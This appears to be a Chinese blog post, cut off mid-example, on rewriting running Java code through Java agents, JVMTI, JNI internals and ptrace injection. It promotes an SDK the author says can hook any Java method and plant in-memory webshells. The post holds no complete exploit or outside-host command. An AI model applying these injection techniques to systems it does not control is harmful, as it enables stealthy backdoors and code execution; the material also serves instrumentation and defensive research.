<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="5a83a7b29059b2d0e3868dc2ecfc4224">前言</h2>
<p>Java原生提供了JVMTI(JVM Tool Interface)和Java Instrumentation API，是插桩、调试或控制程序执行等行为的官方接口。</p>
<h3 data-content="1" id="cb97b1a1bc08ef0239444b4d27b7a617">Java Instrumentation API</h3>
<p>也就是常说的Java agent。从Java SE 5开始，可以使用Java的Instrumentation接口来编写Agent。如果需要在目标JVM启动的同时加载Agent，可以选择实现下面的方法：</p>
<div class="highlight"><pre><span></span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">premain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">);</span>
<span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">premain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">);</span>
</pre></div>
<p>JVM将首先寻找[1]，如果没有发现[1]，再寻找[2]。如果希望在目标JVM运行时加载Agent，则需要实现下面的方法：</p>
<div class="highlight"><pre><span></span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">agentmain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">);</span>
<span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">agentmain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">);</span>
</pre></div>
<p>我们这里只讨论运行时加载的情况。Agent需要打包成一个jar包，在ManiFest属性中指定“Premain-Class”或者“Agent-Class”：</p>
<pre><code>Premain-Class: class
Agent-Class: class</code></pre>
<p>生成agent.jar之后，可以通过com.sun.tools.attach.VirtualMachine的loadAgent方法加载：</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">attachAgentToTargetJVM</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
    <span class="n">List</span><span class="o">&lt;</span><span class="n">VirtualMachineDescriptor</span><span class="o">&gt;</span> <span class="n">virtualMachineDescriptors</span> <span class="o">=</span> <span class="n">VirtualMachine</span><span class="o">.</span><span class="na">list</span><span class="o">();</span>
    <span class="n">VirtualMachineDescriptor</span> <span class="n">targetVM</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="k">for</span> <span class="o">(</span><span class="n">VirtualMachineDescriptor</span> <span class="n">descriptor</span> <span class="o">:</span> <span class="n">virtualMachineDescriptors</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">descriptor</span><span class="o">.</span><span class="na">id</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">configure</span><span class="o">.</span><span class="na">getPid</span><span class="o">()))</span> <span class="o">{</span>
            <span class="n">targetVM</span> <span class="o">=</span> <span class="n">descriptor</span><span class="o">;</span>
            <span class="k">break</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">targetVM</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">"could not find the target jvm by process id:"</span> <span class="o">+</span> <span class="n">configure</span><span class="o">.</span><span class="na">getPid</span><span class="o">());</span>
    <span class="o">}</span>
    <span class="n">VirtualMachine</span> <span class="n">virtualMachine</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">virtualMachine</span> <span class="o">=</span> <span class="n">VirtualMachine</span><span class="o">.</span><span class="na">attach</span><span class="o">(</span><span class="n">targetVM</span><span class="o">);</span>
        <span class="n">virtualMachine</span><span class="o">.</span><span class="na">loadAgent</span><span class="o">(</span><span class="s">"{agent}"</span><span class="o">,</span> <span class="s">"{params}"</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">virtualMachine</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">virtualMachine</span><span class="o">.</span><span class="na">detach</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>以上代码可以用反射实现，使用Java agent这种方式可以修改已有方法，java.lang.instrument.Instrumentation提供了如下方法：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">interface</span> <span class="nc">Instrumentation</span> <span class="o">{</span>
    <span class="cm">/**</span>
<span class="cm">     * 加入一个转换器Transformer，之后的所有的类加载都会被Transformer拦截。</span>
<span class="cm">     * ClassFileTransformer类是一个接口，使用时需要实现它，该类只有一个方法，该方法传递类的信息，返回值是转换后的类的字节码文件。</span>
<span class="cm">     */</span>
    <span class="kt">void</span> <span class="nf">addTransformer</span><span class="o">(</span><span class="n">ClassFileTransformer</span> <span class="n">transformer</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">canRetransform</span><span class="o">);</span>    

    <span class="cm">/**</span>
<span class="cm">     * 对JVM已经加载的类重新触发类加载。使用的就是上面注册的Transformer。</span>
<span class="cm">     * 该方法可以修改方法体、常量池和属性值，但不能新增、删除、重命名属性或方法，也不能修改方法的签名</span>
<span class="cm">     */</span>
    <span class="kt">void</span> <span class="nf">retransformClasses</span><span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;...</span> <span class="n">classes</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">UnmodifiableClassException</span><span class="o">;</span>

   <span class="cm">/**</span>
<span class="cm">   *此方法用于替换类的定义，而不引用现有的类文件字节，就像从源代码重新编译以进行修复和继续调试时所做的那样。</span>
<span class="cm">   *在要转换现有类文件字节的地方(例如在字节码插装中)，应该使用retransformClasses。</span>
<span class="cm">   *该方法可以修改方法体、常量池和属性值，但不能新增、删除、重命名属性或方法，也不能修改方法的签名</span>
<span class="cm">   */</span>
    <span class="kt">void</span> <span class="nf">redefineClasses</span><span class="o">(</span><span class="n">ClassDefinition</span><span class="o">...</span> <span class="n">definitions</span><span class="o">)</span><span class="kd">throws</span>  <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">UnmodifiableClassException</span><span class="o">;</span>

    <span class="cm">/**</span>
<span class="cm">     * 获取一个对象的大小</span>
<span class="cm">     */</span>
    <span class="kt">long</span> <span class="nf">getObjectSize</span><span class="o">(</span><span class="n">Object</span> <span class="n">objectToSize</span><span class="o">);</span>

    <span class="cm">/**</span>
<span class="cm">     * 将一个jar加入到bootstrap classloader的 classpath里</span>
<span class="cm">     */</span>
    <span class="kt">void</span> <span class="nf">appendToBootstrapClassLoaderSearch</span><span class="o">(</span><span class="n">JarFile</span> <span class="n">jarfile</span><span class="o">);</span>

    <span class="cm">/**</span>
<span class="cm">     * 获取当前被JVM加载的所有类对象</span>
<span class="cm">     */</span>
    <span class="n">Class</span><span class="o">[]</span> <span class="nf">getAllLoadedClasses</span><span class="o">();</span>
<span class="o">}</span>
</pre></div>
<p>可以使用redefineClasses方法完成对类方法的修改，结合javassist可以说是非常方便：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">agentmain</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
    <span class="n">Class</span><span class="o">[]</span> <span class="n">loadedClasses</span> <span class="o">=</span> <span class="n">inst</span><span class="o">.</span><span class="na">getAllLoadedClasses</span><span class="o">();</span>
    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">loadedClasses</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">loadedClasses</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"com.huawei.xxxx"</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="n">ClassPool</span> <span class="n">classPool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
                <span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">classPool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
                <span class="n">ctClass</span><span class="o">.</span><span class="na">stopPruning</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>

                <span class="c1">// javaassist freezes methods if their bytecode is saved</span>
                <span class="c1">// defrost so we can still make changes.</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">ctClass</span><span class="o">.</span><span class="na">isFrozen</span><span class="o">())</span> <span class="o">{</span>
                    <span class="n">ctClass</span><span class="o">.</span><span class="na">defrost</span><span class="o">();</span>
                <span class="o">}</span>

                <span class="n">CtMethod</span> <span class="n">method</span><span class="o">;</span> <span class="c1">// populate this from ctClass however you wish</span>

                <span class="n">method</span><span class="o">.</span><span class="na">insertBefore</span><span class="o">(</span><span class="s">"{ System.out.println(\"Wheeeeee!\"); }"</span><span class="o">);</span>
                <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>

                <span class="n">ClassDefinition</span> <span class="n">definition</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassDefinition</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">()),</span> <span class="n">bytecode</span><span class="o">);</span>
                <span class="n">inst</span><span class="o">.</span><span class="na">redefineClasses</span><span class="o">(</span><span class="n">definition</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var9</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">var9</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>以上代码实现在某个类的某个方法的入口处添加一语句 System.out.println("Wheeeeee!")。<br/>
JVM进程与启动agent attach的进程的用户ID必须相同，否则即使是root也不能attach其他用户JVM进程。Java agent的方式需要额外的一个agent jar文件，加载agent的过程可以用反射完成。</p>
<h3 data-content="1" id="b62acdb5ef6512e3a5ad48a68e362969">JVMTI</h3>
<p>在Java SE 5以前，就支持通过C/C++语言实现JVMTI agent，上文讲的Java Instrumentation API的底层就是通过这种方式实现的。开发agent时，需要包含位于JDK include目录下的jvmti.h，这里面定义了使用JVMTI所用到的函数、事件、数据类型和常量，最后agent会被编译成一个动态库。若某个JVMTI代理需要动态attach，则需要导出具有如下原型的函数：</p>
<div class="highlight"><pre><span></span><span class="n">JNIEXPORT</span> <span class="n">jint</span> <span class="n">JNICALL</span> <span class="n">Agent_OnAttach</span><span class="p">(</span><span class="n">JavaVM</span><span class="o">*</span> <span class="n">vm</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">options</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">reserved</span><span class="p">)</span>
</pre></div>
<p>相应的关闭函数</p>
<div class="highlight"><pre><span></span><span class="n">JNIEXPORT</span> <span class="kt">void</span> <span class="n">JNICALL</span> <span class="n">Agent_OnUnload</span><span class="p">(</span><span class="n">JavaVM</span> <span class="o">*</span><span class="n">vm</span><span class="p">)</span>
</pre></div>
<p>JVMTI的函数调用与JNI相似，可以通过一个接口指针来访问JVMTI的函数。JVMTI的接口指针称为环境指针(environment pointer)，环境指针是指向执行环境的指针，其类型为jvmtiEnv*。执行环境包含了与当前JVMTI连接相关的额信息，其第一个值是指向函数表的指针，函数表是一个包含了JVMTI函数指针的数组，每个函数指针在函数表中按预定义的索引值排列。若使用C语言开发，则使用双向链表访问JVMTI函数，环境指针作为调用JVMTI函数的第一个参数传入，例如：</p>
<div class="highlight"><pre><span></span><span class="n">jvmtiEnv</span> <span class="o">*</span><span class="n">jvmti</span><span class="p">;</span>
<span class="p">...</span>
<span class="n">jvmtiError</span> <span class="n">err</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">jvmti</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetLoadedClasses</span><span class="p">(</span><span class="n">jvmti</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">class_count</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">classes</span><span class="p">);</span>
</pre></div>
<p>jvmtiEnv也同样提供了RedefineClasses函数，可以实现Java Instrumentation API同样的功能。</p>
<div class="highlight"><pre><span></span><span class="n">jvmtiError</span> <span class="nf">RedefineClasses</span><span class="p">(</span><span class="n">jint</span> <span class="n">class_count</span><span class="p">,</span>
        <span class="k">const</span> <span class="n">jvmtiClassDefinition</span><span class="o">*</span> <span class="n">class_definitions</span><span class="p">)</span> <span class="p">{</span>
<span class="k">return</span> <span class="n">functions</span><span class="o">-&gt;</span><span class="n">RedefineClasses</span><span class="p">(</span><span class="n">this</span><span class="p">,</span> <span class="n">class_count</span><span class="p">,</span> <span class="n">class_definitions</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>而同时com.sun.tools.attach.VirtualMachine类也提供了对应的加载方法</p>
<pre><code>public abstract void loadAgentLibrary(String agentLibrary,
                    String options)
                               throws AgentLoadException,
                                      AgentInitializationException,
                                      IOException
Loads an agent library.
A JVM TI client is called an agent. It is developed in a native language. A JVM TI agent is deployed in a platform specific manner but it is typically the platform equivalent of a dynamic library. This method causes the given agent library to be loaded into the target VM (if not already loaded). It then causes the target VM to invoke the Agent_OnAttach function as specified in the JVM Tools Interface specification. Note that the Agent_OnAttach function is invoked even if the agent library was loaded prior to invoking this method.

The agent library provided is the name of the agent library. It is interpreted in the target virtual machine in an implementation-dependent manner. Typically an implementation will expand the library name into an operating system specific file name. For example, on UNIX systems, the name foo might be expanded to libfoo.so, and located using the search path specified by the LD_LIBRARY_PATH environment variable.

If the Agent_OnAttach function in the agent library returns an error then an AgentInitializationException is thrown. The return value from the Agent_OnAttach can then be obtained by invoking the returnValue method on the exception.

Parameters:
agentLibrary - The name of the agent library.
options - The options to provide to the Agent_OnAttach function (can be null).
Throws:
AgentLoadException - If the agent library does not exist, or cannot be loaded for another reason.
AgentInitializationException - If the Agent_OnAttach function returns an error
IOException - If an I/O error occurs
NullPointerException - If agentLibrary is null.
See Also:
AgentInitializationException.returnValue()</code></pre>
<p>总结起来，使用JVMTI底层的方式，需要编写提供一个额外的动态库文件（Java Instrumentation API是提供一个jar包），可以实现修改已存在代码。</p>
<h2 data-content="1" id="8dec7045f7a6a4128a66a1de1fa6f454">关于JNI</h2>
<p>上文大致介绍了官方提供的Java instrument方法，与我们今天要讲的主题'ptrace'表面看无关系，要想讲清楚，就不得不讲一下JNI。<br/>
JNI（Java Native Interface，Java本地接口）是一种编程框架，使得Java虚拟机中的Java程序可以调用本地代码，在安卓中应用非常广泛。在JNI框架，native方法一般在单独的.c或.cpp文件中实现。当JVM调用非static函数，就传递一个JNIEnv指针，一个jobject的this指针（如果是static函数则只传送一个JNIEnv指针），后面再跟上函数参数。一个JNI函数看起来类似这样：</p>
<div class="highlight"><pre><span></span><span class="n">JNIEXPORT</span> <span class="kt">void</span> <span class="n">JNICALL</span> <span class="nf">Java_ClassName_MethodName</span>
  <span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span><span class="n">env</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">obj</span><span class="p">)</span>
<span class="p">{</span>
    <span class="cm">/*Implement Native Method Here*/</span>
<span class="p">}</span>
</pre></div>
<p>env指向一个结构包含了到JVM的接口，包含了所有必须的函数与JVM交互、访问Java对象。例如，把本地数组转换为Java数组的JNI函数，把本地字符串转换为Java字符串的JNI函数，实例化对象，抛出异常等。Java程序可以做的任何事情都可以用JNIEnv做到，只是过程非常麻烦。比如调用System.out.println</p>
<div class="highlight"><pre><span></span><span class="c1">// Get system class</span>
<span class="n">jclass</span> <span class="n">syscls</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">FindClass</span><span class="p">(</span><span class="s">"java/lang/System"</span><span class="p">);</span>
<span class="c1">// Lookup the "out" field</span>
<span class="n">jfieldID</span> <span class="n">fid</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">GetStaticFieldID</span><span class="p">(</span><span class="n">syscls</span><span class="p">,</span> <span class="s">"out"</span><span class="p">,</span> <span class="s">"Ljava/io/PrintStream;"</span><span class="p">);</span>
<span class="n">jobject</span> <span class="n">out</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">GetStaticObjectField</span><span class="p">(</span><span class="n">syscls</span><span class="p">,</span> <span class="n">fid</span><span class="p">);</span>
<span class="c1">// Get PrintStream class</span>
<span class="n">jclass</span> <span class="n">pscls</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">FindClass</span><span class="p">(</span><span class="s">"java/io/PrintStream"</span><span class="p">);</span>
<span class="c1">// Lookup printLn(String)</span>
<span class="n">jmethodID</span> <span class="n">mid</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">GetMethodID</span><span class="p">(</span><span class="n">pscls</span><span class="p">,</span> <span class="s">"println"</span><span class="p">,</span> <span class="s">"(Ljava/lang/String;)V"</span><span class="p">);</span>
<span class="c1">// Invoke the method</span>
<span class="n">jstring</span> <span class="n">str</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">NewStringUTF</span><span class="p">(</span> <span class="s">"you are hacked"</span><span class="p">);</span>
<span class="n">env</span><span class="o">-&gt;</span><span class="n">CallVoidMethod</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">mid</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
</pre></div>
<p>在JNI本地代码中，实际获得了很多Java代码不具备的能力，如可以访问进程的任意内存空间、调用系统调用等。jmethodID是JNI中的方法指针类型，它指向JVM底层的方法对象。经过GDB调试和翻阅代码，它的实际结构JVMMethod如下：</p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">MethodInternal</span>
<span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span> <span class="n">vtbl</span><span class="p">;</span>
    <span class="n">ConstMethod</span> <span class="o">*</span> <span class="n">_constMethod</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span> <span class="n">_method_data</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span> <span class="n">_method_counters</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">_access_flags</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">_vtable_index</span><span class="p">;</span>
<span class="cp">#ifdef CC_INTERP</span>
    <span class="kt">int</span>               <span class="n">_result_index</span><span class="p">;</span>               <span class="c1">// C++ interpreter needs for converting results to/from stack</span>
<span class="cp">#endif</span>
    <span class="kt">unsigned</span> <span class="kt">short</span>                <span class="n">_method_size</span><span class="p">;</span>                <span class="c1">// size of this object</span>
    <span class="kt">unsigned</span> <span class="kt">char</span>                <span class="n">_intrinsic_id</span><span class="p">;</span>               <span class="c1">// vmSymbols::intrinsic_id (0 == _none)</span>
    <span class="kt">unsigned</span> <span class="kt">char</span>                <span class="nl">_jfr_towrite</span>      <span class="p">:</span> <span class="mi">1</span><span class="p">,</span>       <span class="c1">// Flags</span>
                    <span class="nl">_caller_sensitive</span> <span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
                    <span class="nl">_force_inline</span>     <span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
                    <span class="nl">_hidden</span>           <span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
                    <span class="nl">_dont_inline</span>      <span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
                                      <span class="o">:</span> <span class="mi">3</span><span class="p">;</span>

<span class="cp">#ifndef PRODUCT</span>
    <span class="kt">int</span>             <span class="n">_compiled_invocation_count</span><span class="p">;</span>  <span class="c1">// Number of nmethod invocations so far (for perf. debugging)</span>
<span class="cp">#endif</span>
    <span class="c1">// Entry point for calling both from and to the interpreter.</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">_i2i_entry</span><span class="p">;</span>           <span class="c1">// All-args-on-stack calling convention</span>
    <span class="c1">// Adapter blob (i2c/c2i) for this Method*. Set once when method is linked.</span>
    <span class="kt">void</span><span class="o">*</span> <span class="n">_adapter</span><span class="p">;</span>
    <span class="c1">// Entry point for calling from compiled code, to compiled code if it exists</span>
    <span class="c1">// or else the interpreter.</span>
    <span class="k">volatile</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span>  <span class="n">_from_compiled_entry</span><span class="p">;</span>        <span class="c1">// Cache of: _code ? _code-&gt;entry_point() : _adapter-&gt;c2i_entry()</span>
    <span class="c1">// The entry point for calling both from and to compiled code is</span>
    <span class="c1">// "_code-&gt;entry_point()".  Because of tiered compilation and de-opt, this</span>
    <span class="c1">// field can come and go.  It can transition from NULL to not-null at any</span>
    <span class="c1">// time (whenever a compile completes).  It can transition from not-null to</span>
    <span class="c1">// NULL only at safepoints (because of a de-opt).</span>
    <span class="kt">void</span> <span class="o">*</span> <span class="k">volatile</span> <span class="n">_code</span><span class="p">;</span>                       <span class="c1">// Points to the corresponding piece of native code</span>
    <span class="k">volatile</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span>           <span class="n">_from_interpreted_entry</span><span class="p">;</span> <span class="c1">// Cache of _code ? _adapter-&gt;i2c_entry() : _i2i_entry</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">JVMMethod</span>
<span class="p">{</span>
    <span class="n">MethodInternal</span> <span class="o">*</span> <span class="n">_method</span><span class="p">;</span>
<span class="k">public</span><span class="o">:</span>
    <span class="kt">void</span> <span class="n">setMethodNative</span><span class="p">();</span>
    <span class="kt">void</span> <span class="o">*</span> <span class="nf">getMethod</span><span class="p">()</span><span class="k">const</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="n">_method</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">void</span> <span class="nf">clear_method_counters</span><span class="p">();</span>
    <span class="kt">bool</span> <span class="nf">isMethodNative</span><span class="p">()</span><span class="k">const</span><span class="p">;</span>
    <span class="kt">bool</span> <span class="nf">isMethodStatic</span><span class="p">()</span><span class="k">const</span><span class="p">;</span>
    <span class="kt">int</span> <span class="nf">getMethodAccessFlags</span><span class="p">()</span><span class="k">const</span><span class="p">;</span>
    <span class="kt">void</span> <span class="nf">print</span><span class="p">()</span><span class="k">const</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">native_function_addr</span><span class="p">()</span><span class="k">const</span><span class="p">;</span>
    <span class="kt">void</span> <span class="nf">native_function_addr</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">v</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">signature_handler_addr</span><span class="p">()</span><span class="k">const</span><span class="p">;</span>
    <span class="kt">void</span> <span class="nf">signature_handler_addr</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">v</span><span class="p">);</span>
    <span class="kt">void</span> <span class="nf">set_size_of_parameters</span><span class="p">(</span><span class="n">u2</span> <span class="n">v</span><span class="p">);</span>
    <span class="kt">int</span> <span class="nf">get_size_of_parameters</span><span class="p">()</span><span class="k">const</span><span class="p">;</span>
<span class="p">};</span>
</pre></div>
<p>因此我们可以把jmethodID类型强制转换为JVMMethod *，然后操作方法对象的任意数据，只要理清数据结构的关系，就可以完成方法的任意修改。在方法的hook实现上，参考frida、xposed在安卓上的实现：先将方法修饰符修改为native，再为该方法提供native的实现。JVMTI的方式在实现上存在限制，比如不能修改java.lang包下的类，而在native层直接修改内存的方式是毫无限制的。</p>
<h2 data-content="1" id="9ea7c32a4ac5b21d71ac5efb1bd7436b">use ptrace</h2>
<p>现在离主题更近了一步，接下来要解决的问题：如何在ptrace执行时获得JNI环境的上下文。<br/>
JNI环境的上下文其实就是JNIEnv这个环境变量指针。jni.h中提供了JNI_GetCreatedJavaVMs，可以获取已经创建的JavaVM实例对象：</p>
<pre><code>_JNI_IMPORT_OR_EXPORT_ jint JNICALL JNI_GetCreatedJavaVMs(JavaVM **, jsize, jsize *);</code></pre>
<p>该方法在libjvm.so作为导出函数，可以通过搜索内存的方式得到。拿到JavaVM实例之后，就可以通过getEnv函数分别获得JNIEnv和jvmtiEnv指针：</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">vm</span><span class="o">-&gt;</span><span class="n">GetEnv</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">_jni_env</span><span class="p">,</span> <span class="n">JNI_VERSION_1_8</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="n">result</span> <span class="o">!=</span> <span class="n">JNI_OK</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">vm</span><span class="o">-&gt;</span><span class="n">AttachCurrentThread</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">_jni_env</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">result</span> <span class="o">!=</span> <span class="n">JNI_OK</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"AttachCurrentThread = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="n">result</span> <span class="o">=</span> <span class="n">vm</span><span class="o">-&gt;</span><span class="n">GetEnv</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">_jvmti_env</span><span class="p">,</span> <span class="n">JVMTI_VERSION_1_2</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="n">result</span> <span class="o">!=</span> <span class="n">JNI_OK</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"GetEnv JVMTI_VERSION_1_2 = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>至此，使用ptrace不仅可以修改任意方法，还可以使用官方提供的JVMTI接口，可谓无所不能。</p>
<h2 data-content="1" id="2245daa63471003722ed7e3f5721a2cb">taycan-sdk</h2>
<p>此项目将以上内容进行封装，实现native层修改java层(JVM)，使用JVMTI及JNI API可以修改java任意类、执行任意代码，完成hook、插入内存马、反射等功能。项目地址：</p>
<pre><code>https://github.com/bigBestWay/taycan-sdk</code></pre>
<h3 data-content="1" id="8c76f454b33697ed6ac7d42d3ca52a80">使用环境</h3>
<p>LINUX KERNEL version &gt; 3.2 GLIBC &gt; 2.15 openJDK/OracleJDK 1.8 64bit</p>
<h3 data-content="1" id="daa6bde16da2dcf6db5c020d58516201">使用方法</h3>
<p>开发语言需要使用C++，源码文件中需要包含sdk include文件夹中java_native_base.h和jvm_method.h，并且要链接lib文件夹下的libtaycan.a。开发步骤如下：</p>
<ol>
<li>定义一个类A继承JavaNativeBase</li>
<li>在类A的构造函数中，使用JNI/JVMTI的API查找java类、方法、执行反射等</li>
<li>如果要hook方法，先定义好替换函数，比如hook_xxx</li>
<li>调用hookJvmMethod，替换方法</li>
<li>静态实例化A</li>
</ol>
<p>之后编译生成动态链接库文件，可以使用java System.load方法调用执行，也可以使用soloader通过ptrace方式注入执行。</p>
<h3 data-content="1" id="2942a9a9d5b646910b4db1db7ce53cc4">示例1：hook java非native函数</h3>
<p>如下TestJni.circle方法定时在屏幕打印haha</p>
<div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">TestJni</span><span class="o">{</span>
    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">circle</span><span class="o">(){</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"haha"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">InterruptedException</span><span class="o">{</span>
